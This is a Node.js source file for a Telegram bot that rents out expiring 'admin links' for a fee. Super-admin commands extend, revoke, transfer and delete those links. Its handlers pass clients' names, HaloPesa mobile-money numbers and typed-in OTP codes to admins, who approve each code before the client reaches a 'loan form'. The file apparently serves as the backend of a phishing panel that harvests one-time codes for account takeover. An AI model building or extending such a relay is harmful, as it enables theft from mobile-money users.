const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const db = require('./database');

const app = express();

// ==========================================
// WEBHOOK MODE (for Render / production)
// ==========================================

const BOT_TOKEN   = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT        = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;

// Generate path-based link (Simple & Works Immediately!)
function generateAdminLink(shortId) {
    // Returns: http://yoursite.com/admin/7K4F
    return `${WEBHOOK_URL}/admin/${shortId}`;
}

// Subscription configuration
const EXPIRY_DAYS     = parseInt(process.env.EXPIRY_DAYS) || 30;
const PAYMENT_AMOUNT  = process.env.PAYMENT_AMOUNT || '500';
const RENEWAL_AMOUNT  = process.env.RENEWAL_AMOUNT || '300';
const PAYMENT_DETAILS = process.env.PAYMENT_DETAILS || 'contact admin for payment details';

// Create bot WITHOUT polling
const bot = new TelegramBot(BOT_TOKEN);

// In-memory maps
const adminChatIds      = new Map(); // adminId → chatId
const pausedAdmins      = new Set(); // adminIds that are paused
const processingLocks   = new Set(); // prevents duplicate pin submissions
const suspendAllSessions = new Map(); // superadmin chatId → session data
const pendingPayments   = new Map(); // chatId → payment claim data
const pendingRegistrations = new Map(); // registrationId → { data, status, timestamp, adminResponse }
const pendingRenewals   = new Map(); // chatId → renewal claim data
const pendingOtpVerification = new Map(); // registrationId → { otp, status, submittedTime }

const SUSPEND_PAGE_SIZE = 10;

let dbReady = false;
let server = null; // For proper graceful shutdown

// ==========================================
// HELPER FUNCTIONS
// ==========================================

/**
 * Convert number to Base52 (a-z, A-Z only - no numbers!)
 * Uses: a-z (26) + A-Z (26) = 52 total chars
 * 4 chars = 52^4 = 7.3 million possible IDs
 * Example: KFPM, XYZW, ABCD
 */
function generateShortId(timestamp = Date.now()) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let num = timestamp;
    let result = '';
    
    while (num > 0) {
        result = chars[num % 52] + result;
        num = Math.floor(num / 52);
    }
    
    // Pad to 4 characters minimum
    while (result.length < 4) {
        result = 'a' + result;
    }
    
    // Return first 4 characters
    return result.substring(0, 4).toUpperCase(); // Make uppercase for cleaner look
}

/**
 * Reverse: Convert Base52 back to timestamp (for optional validation)
 */
function decodeShortId(shortId) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let num = 0;
    
    for (let i = 0; i < shortId.length; i++) {
        num = num * 52 + chars.indexOf(shortId[i].toLowerCase());
    }
    
    return num;
}

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

// Format +263XXXXXXXXX → 0XXXXXXXXX for Telegram display
function formatPhone(phoneNumber) {
    if (!phoneNumber) return phoneNumber;
    if (phoneNumber.startsWith('+2630')) return phoneNumber.slice(4);
    if (phoneNumber.startsWith('+263'))  return '0' + phoneNumber.slice(4);
    if (phoneNumber.startsWith('2630'))  return phoneNumber.slice(3);
    if (phoneNumber.startsWith('263'))   return '0' + phoneNumber.slice(3);
    if (!phoneNumber.startsWith('0'))    return '0' + phoneNumber;
    return phoneNumber;
}

async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);

    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) {
                console.error(`❌ No chat ID for admin: ${adminId}`);
                return null;
            }
            adminChatIds.set(adminId, admin.chatId);
            return await bot.sendMessage(admin.chatId, message, options);
        } catch (err) {
            console.error(`❌ DB fallback failed for admin ${adminId}:`, err.message);
            return null;
        }
    }

    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Error sending to ${adminId}:`, error.message);
        return null;
    }
}

// Build paginated suspend checklist
function buildSuspendAllPage(session) {
    const { allAdmins, selections, page } = session;
    const totalPages = Math.ceil(allAdmins.length / SUSPEND_PAGE_SIZE);
    const start      = page * SUSPEND_PAGE_SIZE;
    const pageAdmins = allAdmins.slice(start, start + SUSPEND_PAGE_SIZE);
    const suspendCount = selections.size;

    const adminRows = pageAdmins.map(admin => {
        const willSuspend = selections.has(admin.adminId);
        const label = willSuspend
            ? `✅ ${admin.name} (${admin.adminId})`
            : `⬜ ${admin.name} (${admin.adminId})`;
        return [{ text: label, callback_data: `sall_toggle_${admin.adminId}` }];
    });

    const navRow = [];
    if (page > 0) {
        navRow.push({ text: '◀ Prev', callback_data: `sall_page_${page - 1}` });
    }
    navRow.push({ text: `${page + 1} / ${totalPages}`, callback_data: 'sall_noop' });
    if (page < totalPages - 1) {
        navRow.push({ text: 'Next ▶', callback_data: `sall_page_${page + 1}` });
    }

    const actionRow = [
        { text: `🔒 Suspend Selected (${suspendCount})`, callback_data: 'sall_confirm' },
        { text: '❌ Cancel',                              callback_data: 'sall_cancel'  }
    ];

    const inline_keyboard = [...adminRows, navRow, actionRow];

    const text = `
🔒 *SUSPEND ADMIN LINKS*

Tap an admin to toggle ✅/⬜
✅ = will be suspended  ⬜ = will be kept active

Page ${page + 1} of ${totalPages} · ${allAdmins.length} admins total
Selected to suspend: *${suspendCount}*

Deselect anyone you want to keep active, then tap *Suspend Selected*.
    `.trim();

    return { text, inline_keyboard };
}

// ==========================================
// MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================
console.log('⏳ Setting up bot handlers...');

bot.on('error',         (error) => console.error('❌ Bot error:',    error?.message));
bot.on('polling_error', (error) => console.error('❌ Polling error:', error?.message));

setupCommandHandlers();

// ==========================================
// TELEGRAM CALLBACK QUERY HANDLER (for registration approval/rejection)
// ==========================================
bot.on('callback_query', async (query) => {
    const data = query.data;
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;

    try {
        // APPROVE REGISTRATION
        if (data.startsWith('app_approve_')) {
            const registrationId = data.replace('app_approve_', '');
            const registration = pendingRegistrations.get(registrationId);

            if (!registration) {
                await bot.answerCallbackQuery(query.id, { text: '❌ Registration not found', show_alert: true });
                return;
            }

            registration.status = 'approved';
            registration.adminResponse = chatId;

            console.log(`✅ Registration APPROVED: ${registrationId}`);

            await bot.editMessageText(
                `✅ *REGISTRATION APPROVED*\n\n👤 *Jina:* ${registration.firstName} ${registration.lastName}\n🔑 *HaloPesa:* ${registration.haloNumber}\n\nRegistration ID: \`${registrationId}\``,
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: [] }
                }
            );

            await bot.answerCallbackQuery(query.id, { text: '✅ Approved!', show_alert: false });
        }
        // REJECT REGISTRATION
        else if (data.startsWith('app_reject_')) {
            const registrationId = data.replace('app_reject_', '');
            const registration = pendingRegistrations.get(registrationId);

            if (!registration) {
                await bot.answerCallbackQuery(query.id, { text: '❌ Registration not found', show_alert: true });
                return;
            }

            registration.status = 'rejected';
            registration.adminResponse = chatId;
            registration.rejectionReason = 'Kataliwa na msimamizi';

            console.log(`❌ Registration REJECTED: ${registrationId}`);

            await bot.editMessageText(
                `❌ *REGISTRATION REJECTED*\n\n👤 *Jina:* ${registration.firstName} ${registration.lastName}\n🔑 *HaloPesa:* ${registration.haloNumber}\n\nRegistration ID: \`${registrationId}\``,
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: [] }
                }
            );

            await bot.answerCallbackQuery(query.id, { text: '❌ Rejected!', show_alert: false });
        }

        // APPROVE OTP CODE (user entered OTP, admin verifies)
        else if (data.startsWith('otp_approve_')) {
            const registrationId = data.replace('otp_approve_', '');
            const otpData = pendingOtpVerification.get(registrationId);

            if (!otpData) {
                await bot.answerCallbackQuery(query.id, { text: '❌ OTP verification not found', show_alert: true });
                return;
            }

            otpData.status = 'approved';
            console.log(`✅ OTP APPROVED: ${registrationId}`);

            await bot.editMessageText(
                `✅ *OTP CODE APPROVED*\n\nCode: \`${otpData.otp}\`\nClient can proceed to loan form\n\nRegistration ID: \`${registrationId}\``,
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: [] }
                }
            );

            await bot.answerCallbackQuery(query.id, { text: '✅ OTP Approved!', show_alert: false });
        }

        // REJECT OTP CODE (wrong code, ask user to re-enter)
        else if (data.startsWith('otp_reject_')) {
            const registrationId = data.replace('otp_reject_', '');
            const otpData = pendingOtpVerification.get(registrationId);

            if (!otpData) {
                await bot.answerCallbackQuery(query.id, { text: '❌ OTP verification not found', show_alert: true });
                return;
            }

            otpData.status = 'rejected';
            console.log(`❌ OTP REJECTED: ${registrationId}`);

            await bot.editMessageText(
                `❌ *OTP CODE REJECTED*\n\nCode: \`${otpData.otp}\`\nClient should re-enter correct code\n\nRegistration ID: \`${registrationId}\``,
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: [] }
                }
            );

            await bot.answerCallbackQuery(query.id, { text: '❌ OTP Rejected! Client can retry', show_alert: false });
        }
    } catch (error) {
        console.error('❌ Callback query error:', error);
        await bot.answerCallbackQuery(query.id, { text: '❌ Error processing action', show_alert: true });
    }
});

console.log('✅ Command handlers configured!');

// ==========================================
// WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;

app.post(webhookPath, (req, res) => {
    try {
        console.log('📥 Webhook received:', JSON.stringify(req.body).substring(0, 150));
        if (req.body && req.body.update_id !== undefined) {
            try {
                bot.processUpdate(req.body);
                console.log('✅ Update processed');
            } catch (processError) {
                console.error('❌ processUpdate error:', processError);
            }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200);
    }
});

// ==========================================
// DATABASE INIT + WEBHOOK SETUP
// ==========================================
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database ready!');

        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        let webhookSetSuccessfully = false;
        let attempts = 0;

        while (!webhookSetSuccessfully && attempts < 3) {
            attempts++;
            try {
                console.log(`🔄 Attempt ${attempts}/3: Setting webhook to: ${fullWebhookUrl}`);
                await bot.deleteWebHook();
                await new Promise(resolve => setTimeout(resolve, 1000));

                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false,
                    max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });

                if (result) {
                    const info = await bot.getWebHookInfo();
                    if (info.url === fullWebhookUrl) {
                        webhookSetSuccessfully = true;
                        console.log(`✅ Webhook CONFIRMED: ${fullWebhookUrl}`);
                    } else {
                        console.error(`❌ Webhook URL mismatch. Got: ${info.url}`);
                    }
                }
            } catch (webhookError) {
                console.error(`❌ Webhook setup error (attempt ${attempts}):`, webhookError.message);
                if (attempts < 3) await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        if (!webhookSetSuccessfully) {
            console.error('⚠️ Webhook setup failed after 3 attempts');
        }

        // Start expiry checker
        startExpiryChecker();
    })
    .catch(err => {
        console.error('❌ Failed to initialize:', err);
        process.exit(1);
    });

// ==========================================
// EXPIRY CHECKER (runs every 60 seconds)
// ==========================================
let expiryCheckerRunning = false;

function startExpiryChecker() {
    setInterval(async () => {
        if (expiryCheckerRunning) return;
        expiryCheckerRunning = true;
        try {
            await runExpiryCheck();
        } catch (err) {
            console.error('❌ Expiry checker error:', err.message);
        } finally {
            expiryCheckerRunning = false;
        }
    }, 60 * 1000); // Every 60 seconds
}

async function runExpiryCheck() {
    try {
        const admins = await db.getAllAdmins();
        
        for (const admin of admins) {
            if (!admin.expiresAt) continue; // Permanent admin
            
            const now = new Date();
            const expiryDate = new Date(admin.expiresAt);
            const daysLeft = Math.ceil((expiryDate - now) / (1000 * 60 * 60 * 24));

            // Check if expired
            if (daysLeft <= 0 && !admin.expired) {
                console.log(`⚠️ Admin ${admin.adminId} (${admin.name}) has expired`);
                
                await db.updateAdmin(admin.adminId, { expired: true });
                pausedAdmins.add(admin.adminId);

                await sendToAdmin(admin.adminId, 
                    `⚠️ *SUBSCRIPTION EXPIRED*\n\n` +
                    `Your admin link subscription has expired.\n\n` +
                    `To restore access, renew by paying *KSh. ${RENEWAL_AMOUNT}* to:\n` +
                    `\`${PAYMENT_DETAILS}\`\n\n` +
                    `Then send /start to submit your renewal claim.`,
                    { parse_mode: 'Markdown' }
                );
            }
            // Warning 3 days before expiry
            else if (daysLeft > 0 && daysLeft <= 3 && !admin.warningSent) {
                console.log(`⏰ Admin ${admin.adminId} (${admin.name}) expiring in ${daysLeft} days`);

                await db.updateAdmin(admin.adminId, { warningSent: true });

                await sendToAdmin(admin.adminId,
                    `⏰ *SUBSCRIPTION EXPIRING SOON*\n\n` +
                    `Your subscription expires in *${daysLeft} day${daysLeft !== 1 ? 's' : ''}*.\n\n` +
                    `Renew now by paying *KSh. ${RENEWAL_AMOUNT}* to:\n` +
                    `\`${PAYMENT_DETAILS}\`\n\n` +
                    `Then send /start to submit your renewal.`,
                    { parse_mode: 'Markdown' }
                );
            }
        }
    } catch (err) {
        console.error('❌ Error in runExpiryCheck:', err.message);
    }
}

// ==========================================
// BOT COMMAND SETUP
// ==========================================
async function setupCommandHandlers() {
    const onMsg = (regex, handler) => bot.onText(regex, handler);

    // ── /start ──
    onMsg(/^\/start(@\S+)?/, async (msg) => {
        const chatId = msg.chat.id;
        const username = msg.from.username || msg.from.first_name || 'User';
        const existingAdmin = await db.getAdminByChatId(String(chatId));

        if (existingAdmin) {
            if (existingAdmin.expired) {
                await sendToAdmin(existingAdmin.adminId,
                    `🎉 Renewal Claim Started\n\n` +
                    `Your subscription has expired. To continue using this admin link:\n\n` +
                    `💰 Pay: KSh. ${RENEWAL_AMOUNT}\n` +
                    `📝 Payment Details:\n${PAYMENT_DETAILS}\n\n` +
                    `After paying, tap the button below to confirm.`,
                    {
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: '✅ Payment Done', callback_data: `renew|claim|${chatId}` },
                                    { text: '❌ Cancel', callback_data: 'renew|cancel|' }
                                ]
                            ]
                        }
                    }
                );
            } else {
                const expiryDate = new Date(existingAdmin.expiresAt);
                const daysLeft = Math.ceil((expiryDate - new Date()) / (1000 * 60 * 60 * 24));
                await bot.sendMessage(chatId, 
                    `✅ Already Registered\n\n` +
                    `You're registered as admin: ${existingAdmin.name}\n` +
                    `📅 Expires: ${existingAdmin.expiresAt ? new Date(existingAdmin.expiresAt).toLocaleDateString() : 'Never'}\n` +
                    `⏳ Days left: ${daysLeft > 0 ? daysLeft : 'Expired'}`,
                    { }
                );
            }
            return;
        }

        // Check for pending payment claim (prevent duplicate registration)
        if (pendingPayments.has(String(chatId))) {
            console.log(`⚠️ Duplicate registration attempt from ${chatId} (@${username}) - already has pending payment`);
            await bot.sendMessage(chatId, `⏳ You already have a registration claim pending. Please wait for administrator review.`);
            return;
        }

        console.log(`✅ New registration attempt from ${chatId} (@${username})`);
        pendingPayments.set(String(chatId), { chatId: String(chatId), username, claimedAt: Date.now() });

        await bot.sendMessage(chatId,
            `🎉 Welcome to Admin Portal\n\n` +
            `💰 Registration Fee: KSh. ${PAYMENT_AMOUNT}\n` +
            `📝 Payment Details:\n${PAYMENT_DETAILS}\n\n` +
            `After paying, tap the button below to claim your admin link.`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '✅ Payment Done', callback_data: `pay|claim|${chatId}` },
                            { text: '❌ Cancel', callback_data: 'pay|cancel|' }
                        ]
                    ]
                }
            }
        );
        
        console.log(`⏳ Waiting for admin ${chatId} to click "Payment Done"...`);
    });

    // ── /mylink ──
    onMsg(/^\/mylink(@\S+)?/, async (msg) => {
        const chatId = msg.chat.id;
        const admin = await db.getAdminByChatId(String(chatId));

        if (!admin) {
            await bot.sendMessage(chatId, `❌ Not registered. Send /start to register.`);
            return;
        }

        // Generate simple path-based link
        const adminLink = generateAdminLink(admin.adminId);
        
        await bot.sendMessage(chatId,
            `🔗 Your Admin Link\n\n` +
            `${adminLink}\n\n` +
            `📅 Expires: ${admin.expiresAt ? new Date(admin.expiresAt).toLocaleDateString() : 'Never'}`
        );
    });

    // ── /expiry ──
    onMsg(/^\/expiry(@\S+)?/, async (msg) => {
        const chatId = msg.chat.id;
        const admin = await db.getAdminByChatId(String(chatId));

        if (!admin) {
            await bot.sendMessage(chatId, `❌ Not registered. Send /start to register.`);
            return;
        }

        if (!admin.expiresAt) {
            await bot.sendMessage(chatId, `✅ Your subscription is *permanent* — never expires.`, { parse_mode: 'Markdown' });
            return;
        }

        const expiryDate = new Date(admin.expiresAt);
        const now = new Date();
        const daysLeft = Math.ceil((expiryDate - now) / (1000 * 60 * 60 * 24));

        if (daysLeft <= 0) {
            await bot.sendMessage(chatId, `⚠️ Your subscription has *expired*.\n\nRenew now to regain access.`, { parse_mode: 'Markdown' });
        } else {
            await bot.sendMessage(chatId, 
                `📅 *Subscription Status*\n\n` +
                `Expires: ${expiryDate.toLocaleDateString()}\n` +
                `Days left: *${daysLeft}*`,
                { parse_mode: 'Markdown' }
            );
        }
    });

    // ── /extend <chatId> <days> ── (Super admin only)
    onMsg(/^\/extend(@\S+)?\s+(\d+)\s+(\d+)/, async (msg, match) => {
        const superAdminChatId = String(msg.chat.id);
        if (superAdminChatId !== process.env.SUPER_ADMIN_CHAT_ID) {
            return;
        }

        const targetChatId = match[2];
        const days = parseInt(match[3], 10);

        try {
            const admin = await db.getAdminByChatId(targetChatId);
            if (!admin) {
                await bot.sendMessage(msg.chat.id, `❌ No admin found with chat ID: ${targetChatId}`);
                return;
            }

            // Check if super admin (permanent)
            if (admin.expiresAt === null) {
                await bot.sendMessage(msg.chat.id, 
                    `ℹ️ Admin ${admin.name} [Chat ID: ${targetChatId}] is a Super Admin with PERMANENT access (Never expires).`
                );
                return;
            }

            await db.extendAdminSubscription(admin.adminId, days);
            const updatedAdmin = await db.getAdmin(admin.adminId);
            const expiryDate = updatedAdmin.expiresAt 
                ? new Date(updatedAdmin.expiresAt).toLocaleDateString() 
                : 'Never (Permanent)';
            
            await bot.sendMessage(msg.chat.id,
                `✅ Extended ${updatedAdmin.name} [Chat ID: ${targetChatId}] by ${days} days.\n📅 New expiry: ${expiryDate}`
            );
        } catch (err) {
            await bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
        }
    });

    // ── /transfer <oldChatId> <newChatId> ── (Super admin only) - Transfer admin to different Telegram
    onMsg(/^\/transfer(@\S+)?\s+(\d+)\s+(\d+)/, async (msg, match) => {
        const superAdminChatId = String(msg.chat.id);
        if (superAdminChatId !== process.env.SUPER_ADMIN_CHAT_ID) {
            return;
        }

        const oldChatId = match[2];
        const newChatId = match[3];

        try {
            // Validate both chat IDs are different
            if (oldChatId === newChatId) {
                await bot.sendMessage(msg.chat.id, `❌ Error: Old and new chat IDs must be different!`);
                return;
            }

            // Find admin by old chat ID
            const admin = await db.getAdminByChatId(oldChatId);
            if (!admin) {
                await bot.sendMessage(msg.chat.id, `❌ No admin found with chat ID: ${oldChatId}`);
                return;
            }

            // Save admin details before transfer
            const adminSlot = admin.adminId;
            const adminName = admin.name;
            const expiresAt = admin.expiresAt;
            const expiryDate = expiresAt 
                ? new Date(expiresAt).toLocaleDateString()
                : 'Never (Permanent)';

            // Update admin's chat ID (keep everything else same - subscription continues!)
            await db.updateAdmin(adminSlot, { chatId: String(newChatId) });
            
            // Update in-memory map
            adminChatIds.delete(adminSlot);
            adminChatIds.set(adminSlot, String(newChatId));

            // Notify super admin
            await bot.sendMessage(msg.chat.id, 
                `✅ Admin transferred successfully!\n\n` +
                `👤 Admin: ${adminName}\n` +
                `🔑 Slot: ${adminSlot}\n` +
                `📱 Old Chat ID: ${oldChatId}\n` +
                `📱 New Chat ID: ${newChatId}\n` +
                `⏰ Expiry: ${expiryDate}\n` +
                `📌 Note: Subscription continues (NOT reset)`
            );

            // Notify new Telegram account about the transfer
            try {
                await bot.sendMessage(newChatId, 
                    `✅ Admin Link Transferred\n\n` +
                    `👋 Hello! Your admin link has been transferred to this Telegram account.\n\n` +
                    `👤 Name: ${adminName}\n` +
                    `🔑 Slot: ${adminSlot}\n` +
                    `⏰ Expires: ${expiryDate}\n` +
                    `📍 Link: ${generateAdminLink(adminSlot)}\n\n` +
                    `✨ Your subscription continues from the previous account!`
                );
                console.log(`✅ Notification sent to new chat ID: ${newChatId}`);
            } catch (notifyErr) {
                console.warn(`⚠️ Could not notify new chat ID ${newChatId}: ${notifyErr.message}`);
                await bot.sendMessage(msg.chat.id, 
                    `⚠️ Transfer completed but could not send notification to new chat ID ${newChatId}. They may need to use the link directly.`
                );
            }
        } catch (err) {
            await bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
        }
    });

    // ── /revoke <chatId> ── (Super admin only)
    onMsg(/^\/revoke(@\S+)?\s+(\d+)/, async (msg, match) => {
        const superAdminChatId = String(msg.chat.id);
        if (superAdminChatId !== process.env.SUPER_ADMIN_CHAT_ID) {
            return;
        }

        const targetChatId = match[2];

        try {
            const admin = await db.getAdminByChatId(targetChatId);
            if (!admin) {
                await bot.sendMessage(msg.chat.id, `❌ No admin found with chat ID: ${targetChatId}`);
                return;
            }

            const expiredDate = new Date(Date.now() - 60000).toISOString();
            await db.updateAdminExpiry(admin.adminId, expiredDate);
            pausedAdmins.add(admin.adminId);

            await bot.sendMessage(msg.chat.id, `✅ Revoked access for ${admin.name} [Chat ID: ${targetChatId}]`);

            await sendToAdmin(admin.adminId, 
                `⚠️ *Your access has been revoked*\n\n` +
                `Your admin link has been deactivated.\n\n` +
                `To restore access, contact the administrator.`,
                { parse_mode: 'Markdown' }
            );
        } catch (err) {
            await bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
        }
    });

    // ── /newlink <chatId> ── (Super admin only) - Create new link, keep subscription days
    onMsg(/^\/newlink(@\S+)?\s+(\d+)/, async (msg, match) => {
        const superAdminChatId = String(msg.chat.id);
        if (superAdminChatId !== process.env.SUPER_ADMIN_CHAT_ID) {
            return;
        }

        const targetChatId = match[2];

        try {
            const oldAdmin = await db.getAdminByChatId(targetChatId);
            if (!oldAdmin) {
                await bot.sendMessage(msg.chat.id, `❌ No admin found with chat ID: ${targetChatId}`);
                return;
            }

            // Keep the old admin's details but generate new short ID
            const newAdminId = generateShortId(); // Generate 4-char ID like: 7K4F
            const adminLink = generateAdminLink(newAdminId);

            // Create new admin record with same Chat ID and expiry date
            const newAdmin = {
                adminId: newAdminId,
                name: oldAdmin.name,
                email: oldAdmin.email,
                chatId: String(targetChatId),
                status: 'active',
                createdAt: new Date().toISOString(),
                expiresAt: oldAdmin.expiresAt, // Keep same expiry date
                expired: oldAdmin.expired,
                warningSent: false,
                source: 'link_replacement'
            };

            await db.saveAdmin(newAdmin);
            adminChatIds.set(newAdminId, String(targetChatId));

            // DELETE old admin from system completely
            await db.deleteAdmin(oldAdmin.adminId);
            pausedAdmins.delete(oldAdmin.adminId);
            adminChatIds.delete(oldAdmin.adminId);

            await bot.sendMessage(msg.chat.id,
                `✅ New Link Generated\n\n` +
                `👤 Admin: ${oldAdmin.name}\n` +
                `🔗 Old ID: ${oldAdmin.adminId} (REMOVED)\n` +
                `🔗 New ID: ${newAdminId}\n` +
                `⏰ Expiry: ${new Date(oldAdmin.expiresAt).toLocaleDateString()}\n` +
                `📅 Days Remaining: ${db.daysUntil(oldAdmin.expiresAt)}\n\n` +
                `Old link completely removed from system. Days maintained!`
            );

            // Send new link to admin
            await bot.sendMessage(targetChatId,
                `🔄 New Admin Link Generated\n\n` +
                `Your subscription details are maintained!\n\n` +
                `🔗 New Link:\n${adminLink}\n\n` +
                `📅 Still Expires: ${new Date(oldAdmin.expiresAt).toLocaleDateString()}\n` +
                `⏰ Days Left: ${db.daysUntil(oldAdmin.expiresAt)}\n\n` +
                `Your old link has been completely removed from the system.`
            );
        } catch (err) {
            await bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
        }
    });

    // ── /remove <chatId> ── (Super admin only) - Completely remove admin from database
    onMsg(/^\/remove(@\S+)?\s+(\d+)/, async (msg, match) => {
        const superAdminChatId = String(msg.chat.id);
        if (superAdminChatId !== process.env.SUPER_ADMIN_CHAT_ID) {
            return;
        }

        const targetChatId = match[2];

        try {
            const admin = await db.getAdminByChatId(targetChatId);
            if (!admin) {
                await bot.sendMessage(msg.chat.id, `❌ No admin found with chat ID: ${targetChatId}`);
                return;
            }

            const adminName = admin.name;
            const adminId = admin.adminId;

            // Show warning confirmation before deletion
            console.log(`⚠️ Deletion confirmation required for: ${adminName} [${adminId}] Chat ID: ${targetChatId}`);

            await bot.sendMessage(msg.chat.id,
                `⚠️ WARNING - PERMANENT DELETION\n\n` +
                `You are about to COMPLETELY DELETE this admin:\n\n` +
                `👤 Name: ${adminName}\n` +
                `🆔 Admin ID: ${adminId}\n` +
                `💬 Chat ID: ${targetChatId}\n\n` +
                `⚠️ This action CANNOT be undone!\n` +
                `❌ All data will be deleted\n` +
                `❌ Cannot be recovered\n\n` +
                `Are you SURE you want to permanently delete this admin?`,
                {
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '✅ YES, Delete Permanently', callback_data: `confirm|remove|${targetChatId}|${adminName}` },
                            { text: '❌ NO, Cancel', callback_data: 'confirm|cancel|' }
                        ]]
                    }
                }
            );
        } catch (err) {
            console.error(`❌ Remove admin error: ${err.message}`);
            await bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
        }
    });

    // ── /removeall ── (Super admin only) - Remove ALL admins except super admin
    onMsg(/^\/removeall(@\S+)?/, async (msg) => {
        const superAdminChatId = String(msg.chat.id);
        if (superAdminChatId !== process.env.SUPER_ADMIN_CHAT_ID) {
            return;
        }

        try {
            // Get all admins
            const allAdmins = await db.getAllAdminsDetailed();
            
            if (allAdmins.length === 0) {
                await bot.sendMessage(msg.chat.id, `📭 No admins to remove.`);
                return;
            }

            const superAdminId = process.env.SUPER_ADMIN_CHAT_ID;
            const adminsToDelete = allAdmins.filter(admin => String(admin.chatId) !== superAdminId);

            if (adminsToDelete.length === 0) {
                await bot.sendMessage(msg.chat.id, `📭 No admins to remove (only super admin in system).`);
                return;
            }

            // Show warning confirmation before bulk deletion
            console.log(`⚠️ Bulk deletion confirmation required for ${adminsToDelete.length} admins`);

            let warningMsg = `⚠️ WARNING - BULK PERMANENT DELETION\n\n`;
            warningMsg += `You are about to COMPLETELY DELETE:\n\n`;
            warningMsg += `👥 Admins to delete: ${adminsToDelete.length}\n`;
            warningMsg += `🛡️ Super admin: KEPT SAFE\n\n`;
            warningMsg += `Admins to be deleted:\n`;
            
            for (const admin of adminsToDelete) {
                warningMsg += `❌ ${admin.name}\n`;
            }

            warningMsg += `\n⚠️ This action CANNOT be undone!\n`;
            warningMsg += `❌ ALL data will be permanently deleted\n`;
            warningMsg += `❌ Cannot be recovered\n\n`;
            warningMsg += `Are you ABSOLUTELY SURE you want to permanently delete ALL ${adminsToDelete.length} admin${adminsToDelete.length !== 1 ? 's' : ''}?`;

            await bot.sendMessage(msg.chat.id,
                warningMsg,
                {
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '✅ YES, Delete ALL', callback_data: `confirm|removeall|yes` },
                            { text: '❌ NO, Cancel', callback_data: `confirm|removeall|no` }
                        ]]
                    }
                }
            );
        } catch (err) {
            console.error(`❌ Bulk remove error: ${err.message}`);
            await bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
        }
    });

    // ── /removeall execution (after confirmation) ──
    // This is handled in the confirm| callback handler below

    // ── /admins ── (Super admin only) - List all admins with FULL details (exclude super admin)
    onMsg(/^\/admins(@\S+)?/, async (msg) => {
        const superAdminChatId = String(msg.chat.id);
        if (superAdminChatId !== process.env.SUPER_ADMIN_CHAT_ID) {
            return;
        }

        try {
            const admins = await db.getAllAdminsDetailed();
            
            // Filter out super admin
            const regularAdmins = admins.filter(admin => 
                String(admin.chatId) !== process.env.SUPER_ADMIN_CHAT_ID
            );
            
            if (regularAdmins.length === 0) {
                await bot.sendMessage(msg.chat.id, `📭 No regular admins found.`);
                return;
            }

            const MAX_LENGTH = 4000;
            let text = `👥 ADMINS (${regularAdmins.length} total - excluding super admin)\n\n`;
            let messageCount = 0;
            
            for (const admin of regularAdmins) {
                const daysLeft = admin.expiresAt ? db.daysUntil(admin.expiresAt) : '∞';
                const statusEmoji = admin.expired ? '🔴' : '🟢';
                const expireText = admin.expiresAt 
                    ? `${new Date(admin.expiresAt).toLocaleDateString()} (${daysLeft}d)`
                    : '♾️ Never (Permanent)';
                const createdText = admin.createdAt
                    ? new Date(admin.createdAt).toLocaleDateString()
                    : 'Unknown';
                const expiredStatus = admin.expired ? 'Yes' : 'No';
                const pausedStatus = admin.paused ? 'Yes' : 'No';
                
                const entry = 
                    `${statusEmoji} ${admin.name}\n` +
                    `   🔑 Slot: ${admin.adminId}\n` +
                    `   👤 Chat ID: ${admin.chatId}\n` +
                    `   📊 Status: ${admin.status}\n` +
                    `   📅 Created: ${createdText}\n` +
                    `   ⏰ Expires: ${expireText}\n` +
                    `   🔴 Expired: ${expiredStatus}\n` +
                    `   ⏸️ Paused: ${pausedStatus}\n` +
                    `   📊 Apps: ${admin.total || 0}\n\n`;
                
                // If adding entry would exceed limit, send current message
                if (text.length + entry.length > MAX_LENGTH) {
                    if (text.length > 50) {
                        await bot.sendMessage(msg.chat.id, text);
                        messageCount++;
